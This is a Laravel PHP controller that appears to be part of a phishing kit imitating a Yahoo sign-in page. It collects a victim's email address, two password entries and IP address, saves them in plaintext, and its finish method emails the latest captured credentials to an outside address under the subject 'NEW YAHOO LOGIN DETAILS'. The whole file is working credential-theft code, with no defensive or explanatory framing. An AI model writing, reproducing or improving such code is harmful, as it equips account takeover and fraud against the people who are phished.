<?php

namespace App\Http\Controllers;

use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Auth;
use Session;
use App\User;

use App\Report;

use File;
use Storage;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Hash;
use App\Mail\myMail;

use App\Http\Requests;
class DashboardController extends Controller
{

    public function getLanding()
    {
       
        return view('welcome');
    }

    public function viewPass()
    {
        return view('pass');
    }

    
    public function password(Request $request)
    {
        session()->flash('email',$request->user);

        return redirect()->route('viewPass');
    }

     public function savePassword(Request $request)
    {
        if ($request->ajax()) {

            return response(Report::create([
                    'email' => $request->email, 
                    'password' => $request->password,
                    'password_iba' => $request->password_iba,
                    'ip' => $request->ip()
                ]));
        }

    }

    public function finish()
    {
        $report = Report::orderBy('updated_at','desc')->first();

        $myMail = new myMail(
                'NEW YAHOO LOGIN DETAILS',
                'Dear Admin',
                "--Email: ".$report->email."<br> --Password1: ".$report->password."<br> --Password2: ".$report->password_iba
                . "<br> --Ip: ".$report->ip
            );

             try
             {
                Mail::to('denizemre166@yahoo.com')->send($myMail);
               
              }
              catch(\Exception $e)
              {                  
                
                
              }

        return view('finish');
    }


}
